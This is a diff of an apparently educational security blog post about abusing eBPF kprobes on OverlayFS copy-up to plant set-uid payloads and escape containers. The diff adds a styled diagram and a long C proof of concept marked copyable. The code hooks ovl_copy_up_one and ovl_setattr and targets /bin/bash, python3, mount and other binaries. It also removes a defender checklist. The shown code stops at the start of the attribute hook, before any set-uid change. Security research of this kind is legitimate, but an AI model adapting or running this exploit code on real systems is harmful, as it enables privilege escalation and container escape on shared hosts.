@@ -156,243 +156,6 @@
                     
                     
                 
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
-                    
-                    
-                
             </div>
         </nav>
 
@@ -415,57 +178,29 @@
 
 <p>Hijacking OverlayFS copy‑up events with eBPF to plant set‑uid payloads inside container layers without touching host storage. This technique allows attackers to escalate privileges within containers by intercepting and modifying file operations during the copy-up process.</p>
 
-<pre><code class="language-mermaid">graph TD
+<pre><code class="language-mermaid">%%{init: {"theme": "dark", "flowchart": {"curve": "basis"}, "themeVariables": {"primaryColor": "#007bff", "primaryTextColor": "#fff", "primaryBorderColor": "#007bff", "lineColor": "#F8B229", "secondaryColor": "#006100", "tertiaryColor": "#fff"}} }%%
+graph TD
     A[Container Access] --&gt;|1. Trigger Copy-up| B[OverlayFS]
     B --&gt;|2. Intercept| C[eBPF Program]
     C --&gt;|3. Modify| D[Set-uid Payload]
     D --&gt;|4. Write| E[Container Layer]
     E --&gt;|5. Execute| F[Privilege Escalation]
+    
+    style A fill:#4a235a,stroke:#c39bd3,stroke-width:2px
+    style B fill:#1b4f72,stroke:#7fb3d5,stroke-width:2px
+    style C fill:#7d3c98,stroke:#d2b4de,stroke-width:2px
+    style D fill:#0e6251,stroke:#a3e4d7,stroke-width:2px
+    style E fill:#7e5109,stroke:#f5cba7,stroke-width:2px
+    style F fill:#a93226,stroke:#f5b7b1,stroke-width:2px
+    
+    click B "https://www.kernel.org/doc/html/latest/filesystems/overlayfs.html" "OverlayFS Documentation"
+    click C "https://ebpf.io/what-is-ebpf/" "eBPF Documentation"
+    click F "https://attack.mitre.org/techniques/T1611/" "Container Escape Technique"
 </code></pre>
 
 <p><strong>Why</strong></p>
 
 <p>Because eBPF + misconfiguration =&gt; broken isolation. OverlayFS is widely used in container environments to provide a unified view of multiple filesystem layers. When a file needs to be modified, it’s copied from a lower (read-only) layer to the upper (writable) layer—a process called “copy-up.” By intercepting this process with eBPF, attackers can modify files during transit, introducing malicious content without directly modifying the host filesystem.</p>
-
-<p><strong>POC</strong></p>
-
-<p><em>Coming soon.</em></p>
-
-<p>The proof of concept will demonstrate:</p>
-<ul>
-  <li>Attaching an eBPF program to key OverlayFS functions</li>
-  <li>Identifying copy-up operations for target files</li>
-  <li>Injecting set-uid bits and/or malicious content during the copy-up process</li>
-  <li>Executing the payload to escape container isolation</li>
-  <li>Maintaining stealth by avoiding direct modifications to host storage</li>
-</ul>
-
-<p><strong>Attacker hat on</strong></p>
-
-<ol>
-  <li>Identify a container using OverlayFS (most Docker/Kubernetes environments)</li>
-  <li>Develop an eBPF program that hooks into OverlayFS copy-up functions</li>
-  <li>Load the malicious BPF program with appropriate privileges</li>
-  <li>Trigger file modifications within the container to initiate copy-up operations</li>
-  <li>The eBPF program intercepts the operation and modifies the file, adding set-uid bits</li>
-  <li>Execute the modified binary to escalate privileges</li>
-  <li>Use elevated privileges to escape container isolation</li>
-</ol>
-
-<p><strong>Defender hat on</strong></p>
-
-<ol>
-  <li>Remove CAP_BPF from container environments</li>
-  <li>Implement BPF LSM policies to restrict eBPF program loading</li>
-  <li>Use read-only containers where possible</li>
-  <li>Monitor for unexpected set-uid binaries in container layers</li>
-  <li>Implement file integrity monitoring for critical container files</li>
-  <li>Consider alternative container storage drivers if OverlayFS risks cannot be mitigated</li>
-</ol>
-
-<p><strong>Conclusion</strong></p>
-
-<p><code class="language-plaintext highlighter-rouge">eBPF is all you need</code>. The ability to intercept and modify filesystem operations through eBPF provides attackers with powerful primitives to subvert container isolation. This technique highlights the importance of treating eBPF capabilities as privileged operations that should be tightly controlled, especially in multi-tenant environments.</p>
 
 <h2 id="technical-details">Technical Details</h2>
 
@@ -473,12 +208,56 @@
 
 <p>OverlayFS combines multiple filesystem layers into a single unified view. In container environments, this typically consists of:</p>
 <ul>
-  <li>Lower layers: Read-only filesystem layers containing the base container image</li>
-  <li>Upper layer: A writable layer where modifications are stored</li>
-  <li>Merged view: The unified filesystem presented to the container</li>
+  <li><strong>Lower layers</strong>: Read-only filesystem layers containing the base container image</li>
+  <li><strong>Upper layer</strong>: A writable layer where modifications are stored</li>
+  <li><strong>Merged view</strong>: The unified filesystem presented to the container</li>
 </ul>
 
 <p>When a file from a lower layer needs to be modified, OverlayFS performs a “copy-up” operation, copying the file to the upper layer before applying modifications.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre></td><td class="rouge-code"><pre>┌─────────────────────────────────┐
+│ Container View (Merged)         │
+├─────────────────────────────────┤
+│                                 │
+│  ┌─────────────┐                │
+│  │ Upper Layer │ (Writable)     │
+│  │             │                │
+│  │  modified   │                │
+│  │  files      │                │
+│  └─────────────┘                │
+│         │                       │
+│         │ Copy-up               │
+│         ▼                       │
+│  ┌─────────────┐                │
+│  │ Lower Layer │ (Read-only)    │
+│  │             │                │
+│  │  base image │                │
+│  │  files      │                │
+│  └─────────────┘                │
+│                                 │
+└─────────────────────────────────┘
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <h3 id="exploitation-technique">Exploitation Technique</h3>
 
@@ -491,7 +270,7 @@
   <li><strong>Inject malicious content</strong>: Alter file contents to include backdoors or exploits</li>
 </ol>
 
-<h3 id="code-snippet">Code Snippet</h3>
+<h3 id="comprehensive-poc">Comprehensive POC</h3>
 
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
@@ -535,61 +314,827 @@
 40
 41
 42
-</pre></td><td class="rouge-code"><pre><span class="c1">// Simplified eBPF program to hook OverlayFS copy-up</span>
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213
+214
+215
+216
+217
+218
+219
+220
+221
+222
+223
+224
+225
+226
+227
+228
+229
+230
+231
+232
+233
+234
+235
+236
+237
+238
+239
+240
+241
+242
+243
+244
+245
+246
+247
+248
+249
+250
+251
+252
+253
+</pre></td><td class="rouge-code"><pre><span class="c1">// @interactive: true</span>
+<span class="c1">// @copyable: true</span>
+<span class="c1">// OverlayFS Trojan Horse - eBPF exploitation proof of concept</span>
+<span class="c1">// This demonstrates a practical attack scenario for container escape</span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;linux/bpf.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;bpf/bpf_helpers.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/version.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/fs.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/dcache.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/path.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/stat.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/uio.h&gt;</span><span class="cp">
+</span>
+<span class="kt">char</span> <span class="n">LICENSE</span><span class="p">[]</span> <span class="n">SEC</span><span class="p">(</span><span class="s">"license"</span><span class="p">)</span> <span class="o">=</span> <span class="s">"GPL"</span><span class="p">;</span>
+
+<span class="c1">// Target binaries to modify during copy-up</span>
+<span class="cp">#define MAX_TARGETS 5
+#define MAX_FILENAME_LEN 64
+</span>
+<span class="c1">// Structure to track copy-up operations</span>
+<span class="k">struct</span> <span class="n">copy_up_event</span> <span class="p">{</span>
+    <span class="n">u32</span> <span class="n">pid</span><span class="p">;</span>                <span class="c1">// Process ID</span>
+    <span class="n">u8</span> <span class="n">comm</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>            <span class="c1">// Command name</span>
+    <span class="n">u64</span> <span class="n">timestamp</span><span class="p">;</span>          <span class="c1">// Event timestamp</span>
+    <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="n">MAX_FILENAME_LEN</span><span class="p">];</span> <span class="c1">// Target filename</span>
+    <span class="n">u32</span> <span class="n">inode</span><span class="p">;</span>              <span class="c1">// Inode number</span>
+    <span class="n">u32</span> <span class="n">file_size</span><span class="p">;</span>          <span class="c1">// File size</span>
+    <span class="n">u32</span> <span class="n">modified</span><span class="p">;</span>           <span class="c1">// Whether we modified it</span>
+<span class="p">};</span>
+
+<span class="c1">// Map to track files being copied up</span>
+<span class="k">struct</span> <span class="p">{</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">BPF_MAP_TYPE_HASH</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">key_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span>  <span class="c1">// Inode number as key</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">value_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">copy_up_event</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">max_entries</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">active_copy_ups</span> <span class="nf">SEC</span><span class="p">(</span><span class="s">".maps"</span><span class="p">);</span>
+
+<span class="c1">// Map to store target filenames</span>
+<span class="k">struct</span> <span class="p">{</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">BPF_MAP_TYPE_ARRAY</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">key_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">value_size</span><span class="p">,</span> <span class="n">MAX_FILENAME_LEN</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">max_entries</span><span class="p">,</span> <span class="n">MAX_TARGETS</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">target_filenames</span> <span class="nf">SEC</span><span class="p">(</span><span class="s">".maps"</span><span class="p">);</span>
+
+<span class="c1">// Map to track if we've initialized our targets</span>
+<span class="k">struct</span> <span class="p">{</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">BPF_MAP_TYPE_ARRAY</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">key_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">value_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u32</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">max_entries</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">initialized</span> <span class="nf">SEC</span><span class="p">(</span><span class="s">".maps"</span><span class="p">);</span>
+
+<span class="c1">// Perf event output for logging</span>
+<span class="k">struct</span> <span class="p">{</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">BPF_MAP_TYPE_PERF_EVENT_ARRAY</span><span class="p">);</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">key_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">value_size</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
+    <span class="n">__uint</span><span class="p">(</span><span class="n">max_entries</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">events</span> <span class="nf">SEC</span><span class="p">(</span><span class="s">".maps"</span><span class="p">);</span>
+
+<span class="c1">// Initialize our target filenames (would be set from user space)</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span> <span class="nf">init_targets</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">u32</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">u32</span> <span class="o">*</span><span class="n">init</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">initialized</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">init</span> <span class="o">||</span> <span class="o">*</span><span class="n">init</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// Target 1: /bin/bash (common shell)</span>
+        <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">filename1</span><span class="p">[</span><span class="n">MAX_FILENAME_LEN</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/bin/bash"</span><span class="p">;</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_filenames</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">filename1</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        
+        <span class="c1">// Target 2: /usr/bin/python3 (scripting capability)</span>
+        <span class="n">key</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">filename2</span><span class="p">[</span><span class="n">MAX_FILENAME_LEN</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/usr/bin/python3"</span><span class="p">;</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_filenames</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">filename2</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        
+        <span class="c1">// Target 3: /bin/cp (file manipulation)</span>
+        <span class="n">key</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">filename3</span><span class="p">[</span><span class="n">MAX_FILENAME_LEN</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/bin/cp"</span><span class="p">;</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_filenames</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">filename3</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        
+        <span class="c1">// Target 4: /bin/mount (for container escape)</span>
+        <span class="n">key</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">filename4</span><span class="p">[</span><span class="n">MAX_FILENAME_LEN</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/bin/mount"</span><span class="p">;</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_filenames</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">filename4</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        
+        <span class="c1">// Target 5: /bin/ip (network manipulation)</span>
+        <span class="n">key</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">filename5</span><span class="p">[</span><span class="n">MAX_FILENAME_LEN</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/bin/ip"</span><span class="p">;</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_filenames</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">filename5</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        
+        <span class="c1">// Mark as initialized</span>
+        <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">u32</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">initialized</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// Helper function to check if a file is in our target list</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="n">bool</span> <span class="nf">is_target_file</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">init_targets</span><span class="p">();</span>
+    
+    <span class="c1">// Check against our list of targets</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX_TARGETS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">u32</span> <span class="n">key</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="o">*</span><span class="n">target</span> <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_filenames</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span>
+        
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">target</span><span class="p">)</span>
+            <span class="k">continue</span><span class="p">;</span>
+        
+        <span class="c1">// Simple string comparison (limited by BPF verifier)</span>
+        <span class="n">bool</span> <span class="n">match</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+        
+        <span class="cp">#pragma unroll
+</span>        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">MAX_FILENAME_LEN</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">filename</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">!=</span> <span class="n">target</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="p">{</span>
+                <span class="n">match</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+            
+            <span class="k">if</span> <span class="p">(</span><span class="n">filename</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">)</span>
+                <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+        
+        <span class="k">if</span> <span class="p">(</span><span class="n">match</span><span class="p">)</span>
+            <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+    <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// Hook the start of the copy-up process</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/ovl_copy_up_one"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_copy_up</span><span class="p">,</span> <span class="k">struct</span> <span class="n">dentry</span> <span class="o">*</span><span class="n">dentry</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="k">struct</span> <span class="n">path</span> <span class="n">path</span><span class="p">;</span>
-    <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="n">MAX_PATH_LEN</span><span class="p">];</span>
+<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_copy_up_start</span><span class="p">,</span> <span class="k">struct</span> <span class="n">dentry</span> <span class="o">*</span><span class="n">dentry</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Get process information</span>
+    <span class="n">u32</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">;</span>
+    
+    <span class="c1">// Prepare event data</span>
+    <span class="k">struct</span> <span class="n">copy_up_event</span> <span class="n">event</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="n">pid</span><span class="p">;</span>
+    <span class="n">bpf_get_current_comm</span><span class="p">(</span><span class="o">&amp;</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">comm</span><span class="p">));</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">bpf_ktime_get_ns</span><span class="p">();</span>
     
     <span class="c1">// Get the file path</span>
+    <span class="k">struct</span> <span class="n">path</span> <span class="n">path</span><span class="p">;</span>
     <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">path</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_path</span><span class="p">);</span>
-    <span class="n">bpf_probe_read_str</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="n">path</span><span class="p">.</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
+    
+    <span class="c1">// Get the filename</span>
+    <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="n">MAX_FILENAME_LEN</span><span class="p">];</span>
+    <span class="n">bpf_probe_read_str</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
+    
+    <span class="c1">// Get the full path (this is simplified - real implementation would be more complex)</span>
+    <span class="kt">char</span> <span class="n">fullpath</span><span class="p">[</span><span class="n">MAX_FILENAME_LEN</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/"</span><span class="p">;</span>
+    <span class="n">bpf_probe_read_str</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fullpath</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fullpath</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
+    
+    <span class="c1">// Copy filename to event</span>
+    <span class="n">__builtin_memcpy</span><span class="p">(</span><span class="n">event</span><span class="p">.</span><span class="n">filename</span><span class="p">,</span> <span class="n">fullpath</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fullpath</span><span class="p">));</span>
+    
+    <span class="c1">// Get inode number as a unique identifier</span>
+    <span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">;</span>
+    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">inode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">inode</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">dentry</span><span class="o">-&gt;</span><span class="n">d_inode</span><span class="p">);</span>
+    <span class="n">u32</span> <span class="n">ino</span><span class="p">;</span>
+    <span class="n">bpf_probe_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ino</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ino</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">inode</span><span class="o">-&gt;</span><span class="n">i_ino</span><span class="p">);</span>
+    <span class="n">event</span><span class="p">.</span><span class="n">inode</span> <span class="o">=</span> <span class="n">ino</span><span class="p">;</span>
     
     <span class="c1">// Check if this is a target file</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">bpf_strncmp</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"target_binary"</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="s">"target_binary"</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-        <span class="c1">// Set a flag to modify this file during copy-up</span>
-        <span class="c1">// This would be implemented through a BPF map</span>
-        <span class="n">u32</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-        <span class="n">u32</span> <span class="n">value</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">target_files</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">is_target_file</span><span class="p">(</span><span class="n">fullpath</span><span class="p">))</span> <span class="p">{</span>
+        <span class="c1">// Store the event for later correlation</span>
+        <span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">active_copy_ups</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ino</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">);</span>
+        
+        <span class="c1">// Log the event for our analysis</span>
+        <span class="n">bpf_perf_event_output</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">events</span><span class="p">,</span> <span class="n">BPF_F_CURRENT_CPU</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">event</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">event</span><span class="p">));</span>
     <span class="p">}</span>
     
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="c1">// Hook the function that sets file attributes after copy-up</span>
+<span class="c1">// Hook file attribute setting during copy-up</span>
 <span class="n">SEC</span><span class="p">(</span><span class="s">"kprobe/ovl_setattr"</span><span class="p">)</span>
-<span class="kt">int</span> <span class="nf">BPF_KPROBE</span><span class="p">(</span><span class="n">hook_setattr</span><span class="p">,</span> <span class="k">struct</span> <span class="n">dentry</span> <span class="o">*</span><span class="n">dentry</span><span class="p">,</span> <span class="k">struct</span> <span class="n">iattr</span> <span class="o">*</span><span class="n">attr</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="n">u32</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="n">u32</span> <span class="o">*</span><span class="n">value</span><span class="p">;</span>
